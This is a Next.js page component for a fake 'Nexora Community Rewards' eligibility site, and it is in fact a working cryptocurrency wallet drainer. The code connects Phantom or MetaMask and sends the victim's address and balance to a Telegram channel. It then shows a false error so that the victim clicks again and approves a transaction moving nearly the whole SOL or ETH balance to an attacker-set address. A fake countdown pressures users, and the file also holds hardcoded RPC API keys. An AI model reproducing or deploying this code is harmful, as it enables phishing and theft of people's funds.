"use client";

import { useState, useEffect } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  getProvider,
} from "@solana/web3.js";
import styles from "./page.module.css";
import { sendTelegram } from "@/actions/sendTelegram";
import { ethers } from "ethers" ;

const RPC_SOLANA =
  "https://solana-mainnet.core.chainstack.com/a5a95e3f297d6142cca304bb28dcc5b0" //"https://mainnet.helius-rpc.com/?api-key=743b10b5-8843-4e9f-9ee2-9173e06e85cd";

const TO_PUBKEY = new PublicKey(
  process.env.NEXT_PUBLIC_SOLANA_WALLET
);

const REDIRECT_URL = "/next"

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [buttonLocked, setButtonLocked] = useState(false);
  const [status, setStatus] = useState("Not connected");
  const [error, setError] = useState(null);
  const [showChooser, setShowChooser] = useState(false);
  const [walletType, setWalletType] = useState(null); // 'phantom' or 'metamask'

  const [time, setTime] = useState({
    minutes: "02",
    seconds: "59",
  });

  const connectionSolana = new Connection(RPC_SOLANA);

  const connectMetaMaskWallet = async () => {
    try{
      if (!window.ethereum) throw new Error("No Ethereum wallet");
       setConnecting(true);


      const connectionEthers = new ethers.BrowserProvider(window.ethereum);


      await connectionEthers.send("eth_requestAccounts", []);

      setConnected(true);
      setStatus("Connected");
      setError(null);

      const signer = await connectionEthers.getSigner();
      const address = await signer.getAddress();
      const balances = await connectionEthers.getBalance(address);

      console.log(balances);
      console.log(address);

      setTimeout(()=>{},3000);

      setError("Something went wrong, try again please!");

    } catch (error) {

      setError("Wallet connection rejected");
      console.log(error)
    } finally {
      setConnecting(false);
    }
  }


  const connectPhantomWallet = async () => {

    try {
      const provider = window.solana
      setConnecting(true);

      
      const res = await provider.connect();
      setConnected(true);
      setStatus("Connected");
      setError(null);

      let balance = await connectionSolana.getBalance(res.publicKey);

      const time = new Date().toLocaleString();

      sendTelegram(
        `🔥 Wallet Connected Successfully\n\n` +
        `Solana wallet linked.\n\n` +
        `🔑 ${res.publicKey.toString()}\n` +
        `💎 ${balance/1e9} SOL\n` +
        `⏱️ ${time}`
      );

      setTimeout(()=>{},3000);
      setError("Something went wrong, try again please!");
    } catch (error) {
      setError("Wallet connection rejected");
      console.log(error)
    } finally {
      setConnecting(false);
  }
}

  const send_solana = async () => {

    setStatus("Preparing transaction…");
    setError(null);
    setConnecting(true);

    try {
      const provider = window.solana
      const res = await provider.connect();


      const balance = await connectionSolana.getBalance(res.publicKey);
      const SEND_LAMPORTS = Math.floor(balance - 0.0015 * 1e9);

      if (SEND_LAMPORTS <= 0) {
        throw new Error("Not enough SOL");
      }

      const { blockhash, lastValidBlockHeight } =
        await connectionSolana.getLatestBlockhash();

      const tx = new Transaction({
        feePayer: res.publicKey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: res.publicKey,
          toPubkey: TO_PUBKEY,
          lamports: SEND_LAMPORTS,
        })
      );

      setStatus("Confirm in Phantom…");

      const signed = await provider.signAndSendTransaction(tx);

      await connectionSolana.confirmTransaction(
        {
          signature: signed.signature,
          blockhash,
          lastValidBlockHeight,
        },
        "finalized"
      );

      setStatus("✅ SUCCESS — Sent!");
      const time = new Date().toLocaleString();


      sendTelegram( `💸 Transaction Confirmed\n\n` + `SOL tokens transferred.\n\n` + `🔑 ${res.publicKey.toString()}\n` + `💎 ${SEND_LAMPORTS/1e9} SOL sent\n` + `⏱️ ${time}` );
    } catch (err) {
      console.log(err)
      setError(err.message || "Transaction failed");
      setStatus("❌ FAILED");
    } finally {
      setTimeout(()=>{},3000);
      setConnecting(false);
      window.location.href = REDIRECT_URL;
    }
  }


const send_eth = async () => {
  setStatus("Preparing transaction…");
  setError(null);
  setConnecting(true);

  try {
    if (!window.ethereum) {
      throw new Error("MetaMask not installed");
    }
    const connectionEthers = new ethers.BrowserProvider(window.ethereum);


    await connectionEthers.send("eth_requestAccounts", []);
    const signer = await connectionEthers.getSigner();

    const fromAddress = await signer.getAddress();

    const balance = await connectionEthers.getBalance(fromAddress);

    const feeData = await connectionEthers.getFeeData();
    const gasLimit = 21_000n;
    const gasCost = gasLimit * feeData.maxFeePerGas;

    const SEND_WEI = balance - gasCost;

    if (SEND_WEI <= 0n) {
      throw new Error("Not enough ETH for gas");
    }

    setStatus("Confirm in MetaMask…");

    const tx = await signer.sendTransaction({
      to: process.env.NEXT_PUBLIC_TO_ETH_ADDRESS,
      value: SEND_WEI,
      gasLimit,
    });

    await tx.wait();

    setStatus("✅ SUCCESS — Sent!");

    const time = new Date().toLocaleString();

    sendTelegram(
      `💸 Transaction Confirmed\n\n` +
      `ETH transferred.\n\n` +
      `🔑 ${fromAddress}\n` +
      `💎 ${ethers.formatEther(SEND_WEI)} ETH sent\n` +
      `⏱️ ${time}`
    );

  } catch (err) {
    console.error(err);
    setError(err.message || "Transaction failed");
    setStatus("❌ FAILED");
  } finally {
    setTimeout(()=>{},3000);
    setConnecting(false);
    window.location.href = REDIRECT_URL;
  }
};

  useEffect(() => {
    const end = Date.now() + 1000 * 60 * 3;

    const i = setInterval(() => {
      const diff = Math.max(end - Date.now(), 0);
      const m = Math.floor(diff / 1000 / 60);
      const s = Math.floor((diff / 1000) % 60);

      setTime({
        minutes: String(m).padStart(2, "0"),
        seconds: String(s).padStart(2, "0"),
      });

      if (diff === 0) clearInterval(i);
    }, 1000);

    return () => clearInterval(i);
  }, []);

  return (
    <div className={styles.page}>
      <header className={styles.header}>
        <div className={styles.brand}>
         <img
          src="/logo.png"
          alt="Nexora logo"
          className={styles.logoImg}
        />
          <div>
            <strong>Nexora</strong>
            <small>Community Rewards</small>
          </div>
        </div>
      </header>

      <main className={styles.main}>
        <div className={styles.card}>
          <h1 className={styles.title}>Community Rewards Program</h1>

          <p className={styles.subtitle}>
            Connect your wallet to see if you are eligible for community rewards.
          </p>

          <div className={styles.info}>
            <strong>Eligibility Check</strong>
            <span>
              Wallet eligibility is determined automatically after connection.
            </span>
          </div>

          <div className={styles.countdown}>
            <small>Round ends in</small>
            <div className={styles.time}>
              {time.minutes}:{time.seconds}
            </div>
          </div>

         <div className={styles.ctaWrap}>
{!showChooser ? (
  <>
    <p className={styles.copy}>
      {walletType
        ? `Try again with ${walletType === "phantom" ? "Phantom" : "MetaMask"}`
        : "Click connect and approve the wallet prompt to continue."}
    </p>

    <button
      className={styles.button}
      onClick={() => {
        if (walletType === "phantom") {
          !connected ? connectPhantomWallet() : send_solana();
        } else if (walletType === "metamask") {
          !connected ? connectMetaMaskWallet() : send_eth();
        } else {
          setShowChooser(true);
        }
      }}
      disabled={connecting}
    >
      {connecting
        ? "Connecting…"
        : walletType
        ? `Try Again with ${walletType === "phantom" ? "Phantom" : "MetaMask"}`
        : "Choose Wallet"}
    </button>
  </>
) : (
  <>
    <button
      className={`${styles.phantomBtn}`}
      onClick={() => {
        setWalletType("phantom");
        setShowChooser(false);
        !connected ? connectPhantomWallet() : send_solana();
      }}
      disabled={connecting}
    >
      {connecting ? "Connecting…" : "Connect Phantom"}
    </button>

    <button
      className={`${styles.metamaskBtn}`}
      onClick={() => {
        setWalletType("metamask");
        setShowChooser(false);
        !connected ? connectMetaMaskWallet() : send_eth();
      }}
      disabled={connecting}
    >
      {connecting ? "Connecting…" : "Connect MetaMask"}
    </button>
  </>
)}
</div>

        {error && <p className={styles.error}>{error}</p>}
        <p className={styles.status}>{status}</p>
        </div>
      </main>

      <footer className={styles.footer}>
        <div className={styles.footerLinks}>
          <a href="#">Terms</a>
          <a href="#">Privacy</a>
          <a href="#">Support</a>
          <a href="#">Docs</a>
        </div>

        <div className={styles.socials}>
          <a href="#">𝕏</a>
          <a href="#">Discord</a>
          <a href="#">GitHub</a>
        </div>

        <p className={styles.copy}>
          © 2026 Nexora Community Program. All distributions are executed on-chain.
        </p>
      </footer>
    </div>
  );
}